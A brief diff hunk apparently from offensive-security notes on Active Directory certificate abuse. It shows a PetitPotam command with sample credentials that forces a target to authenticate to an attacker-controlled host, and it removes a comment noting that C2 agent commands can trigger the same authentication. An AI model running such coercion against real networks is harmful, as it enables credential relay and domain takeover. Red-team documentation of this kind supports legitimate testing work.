@@ -274,7 +274,6 @@ python3 PetitPotam.py -u coward -p 'P@ssw0rd' -d kawakatz.local attacker@80/shar
 
 # If only anonymous authentication occurs,
 # verify that the target is treated as an Intranet Zone.
-# ls commands from C2 agents can trigger authentication as an alternative to PetitPotam
 
 # Abuse the certificate as above...
 ```
